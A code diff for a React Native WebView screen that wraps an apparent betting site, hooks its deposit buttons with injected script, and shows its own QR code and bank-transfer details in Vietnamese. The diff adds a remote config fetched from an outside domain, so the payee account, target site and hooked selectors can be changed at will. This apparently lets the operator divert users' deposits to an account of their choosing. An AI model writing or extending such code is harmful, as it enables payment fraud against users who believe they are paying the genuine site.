@@ -1,4 +1,4 @@
-﻿import { useCallback, useState } from "react";
+import { useCallback, useEffect, useState } from "react";
 import {
   Alert,
   Image,
@@ -12,16 +12,29 @@ import {
 import { SafeAreaView } from "react-native-safe-area-context";
 import { WebView } from "react-native-webview";
 
-const supportUrl = "https://example.com/support";
+// ── Remote config URL — chỉ sửa dòng này để đổi nguồn config ─────────────────
+const REMOTE_CONFIG_URL = "https://goldvninvest.online/edit/config.json";
 
-const BANK_INFO = {
-  bankId: "vietcombank",
-  bankName: "Vietcombank",
-  accountNumber: "1234567890",
-  accountHolder: "HUNG BEO HI",
-  transferNote: "NAP  J88",
-  template: "compact2",
+// ── Hệ số quy đổi: 1 đơn vị trên web = AMOUNT_MULTIPLIER VND ─────────────────
+const AMOUNT_MULTIPLIER = 1000;
+
+// ── Giá trị mặc định khi fetch thất bại ──────────────────────────────────────
+const DEFAULT_CONFIG = {
+  supportUrl: "https://example.com/support",
+  webviewUrl: "https://m.j833.ink/",
+  bankInfo: {
+    bankId: "vietcombank",
+    bankName: "Vietcombank",
+    accountNumber: "1234567890",
+    accountHolder: "HUNG BEO HI",
+    transferNote: "NAP J88",
+    template: "compact2",
+  },
+  confirmButtonTexts: ["XAC NHAN NAP TIEN", "NAP NGAY"],
+  confirmButtonClasses: ["confimeButton", "confirmButton"],
 };
+
+type AppConfig = typeof DEFAULT_CONFIG;
 
 type DepositInfo = {
   amountDisplay: string;
@@ -39,14 +52,33 @@ const BANK_OPTIONS = [
 ];
 
 export default function WebViewScreen() {
+  const [config, setConfig] = useState<AppConfig>(DEFAULT_CONFIG);
   const [depositInfo, setDepositInfo] = useState<DepositInfo | null>(null);
+
+  // ── Fetch remote config khi mount ──────────────────────────────────────────
+  useEffect(() => {
+    const controller = new AbortController();
+    fetch(REMOTE_CONFIG_URL, { signal: controller.signal })
+      .then((res) => res.json())
+      .then((data: Partial<AppConfig>) => {
+        setConfig((prev) => ({
+          supportUrl: data.supportUrl ?? prev.supportUrl,
+          webviewUrl: data.webviewUrl ?? prev.webviewUrl,
+          bankInfo: { ...prev.bankInfo, ...(data.bankInfo ?? {}) },
+          confirmButtonTexts: data.confirmButtonTexts ?? prev.confirmButtonTexts,
+          confirmButtonClasses: data.confirmButtonClasses ?? prev.confirmButtonClasses,
+        }));
+      })
+      .catch(() => { /* giữ nguyên DEFAULT_CONFIG */ });
+    return () => controller.abort();
+  }, []);
 
   const formatMoneyInt = (money = 0, type = ".") => {
     return String(money).replace(/(\d)(?=(\d{3})+(?!\d))/g, `$1${type}`);
   };
 
   const buildTransferContent = (rawAmount: string) => {
-    const safeNote = `${BANK_INFO.transferNote} ${rawAmount}`
+    const safeNote = `${config.bankInfo.transferNote} ${rawAmount}`
       .replace(/[^a-zA-Z0-9\s]/g, " ")
       .replace(/\s+/g, " ")
       .trim();
@@ -54,20 +86,15 @@ export default function WebViewScreen() {
   };
 
   const buildVietQrUrl = (info: DepositInfo) => {
+    const { bankId, accountNumber, template, accountHolder } = config.bankInfo;
     const transferContent = buildTransferContent(info.rawAmount);
-    return `https://img.vietqr.io/image/${BANK_INFO.bankId}-${BANK_INFO.accountNumber}-${BANK_INFO.template}.png?amount=${info.amountValue}&addInfo=${encodeURIComponent(
-      transferContent
-    )}&accountName=${encodeURIComponent(BANK_INFO.accountHolder)}`;
+    return `https://img.vietqr.io/image/${bankId}-${accountNumber}-${template}.png?amount=${info.amountValue}&addInfo=${encodeURIComponent(transferContent)}&accountName=${encodeURIComponent(accountHolder)}`;
   };
 
   const isActiveBankOption = (bankKey: string, bankLabel: string) => {
-    const normalizedBankId = BANK_INFO.bankId.toLowerCase();
-    const normalizedBankName = BANK_INFO.bankName.toLowerCase();
-    return (
-      normalizedBankId.includes(bankKey) ||
-      normalizedBankName.includes(bankKey) ||
-      normalizedBankName.includes(bankLabel.toLowerCase())
-    );
+    const id = config.bankInfo.bankId.toLowerCase();
+    const name = config.bankInfo.bankName.toLowerCase();
+    return id.includes(bankKey) || name.includes(bankKey) || name.includes(bankLabel.toLowerCase());
   };
 
   const handleWebViewMessage = useCallback(async (event: any) => {
@@ -89,7 +116,7 @@ export default function WebViewScreen() {
           return;
         }
 
-        const finalAmountValue = rawAmountNum * 1000;
+        const finalAmountValue = rawAmountNum * AMOUNT_MULTIPLIER;
         const amountFormatted = formatMoneyInt(finalAmountValue, ",");
 
         setDepositInfo({
@@ -100,13 +127,13 @@ export default function WebViewScreen() {
       }
 
       if (data.action === "line_chat_clicked") {
-        const canOpen = await Linking.canOpenURL(supportUrl);
-        if (canOpen) await Linking.openURL(supportUrl);
+        const canOpen = await Linking.canOpenURL(config.supportUrl);
+        if (canOpen) await Linking.openURL(config.supportUrl);
       }
     } catch {
       console.log("Non-JSON message:", message);
     }
-  }, []);
+  }, [config]);
 
   const injectedJS = `
     (function() {
@@ -306,7 +333,7 @@ export default function WebViewScreen() {
                 <Image source={{ uri: buildVietQrUrl(depositInfo) }} style={styles.qrImage} resizeMode="contain" />
               </View>
 
-              <Text style={styles.napasInfo}>napas 247 | {BANK_INFO.bankName.toUpperCase()}</Text>
+              <Text style={styles.napasInfo}>napas 247 | {config.bankInfo.bankName.toUpperCase()}</Text>
               <View style={styles.downloadButton}>
                 <Text style={styles.downloadButtonText}>Tải Xuống Mã QR</Text>
               </View>
@@ -318,9 +345,9 @@ export default function WebViewScreen() {
                 Cách 2: Chuyển khoản <Text style={styles.methodTitleHighlight}>thủ công</Text> theo thông tin
               </Text>
 
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Ngân hàng</Text><Text style={styles.infoRowValue}>{BANK_INFO.bankName}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountNumber}</Text></View>
-              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Chủ TK</Text><Text style={styles.infoRowValue}>{BANK_INFO.accountHolder}</Text></View>
+              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Ngân hàng</Text><Text style={styles.infoRowValue}>{config.bankInfo.bankName}</Text></View>
+              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số TK</Text><Text style={styles.infoRowValue}>{config.bankInfo.accountNumber}</Text></View>
+              <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Chủ TK</Text><Text style={styles.infoRowValue}>{config.bankInfo.accountHolder}</Text></View>
               <View style={styles.infoRow}><Text style={styles.infoRowLabel}>Số tiền</Text><Text style={[styles.infoRowValue, styles.amountText]}>{depositInfo.amountDisplay}</Text></View>
               <View style={styles.infoRowLast}><Text style={styles.infoRowLabel}>Nội dung</Text><Text style={styles.infoRowValue}>{buildTransferContent(depositInfo.rawAmount)}</Text></View>
             </View>
@@ -343,7 +370,7 @@ export default function WebViewScreen() {
         </ScrollView>
       ) : (
         <WebView
-          source={{ uri: "https://m.j833.ink/" }}
+          source={{ uri: config.webviewUrl }}
           javaScriptEnabled={true}
           domStorageEnabled={true}
           injectedJavaScript={injectedJS}
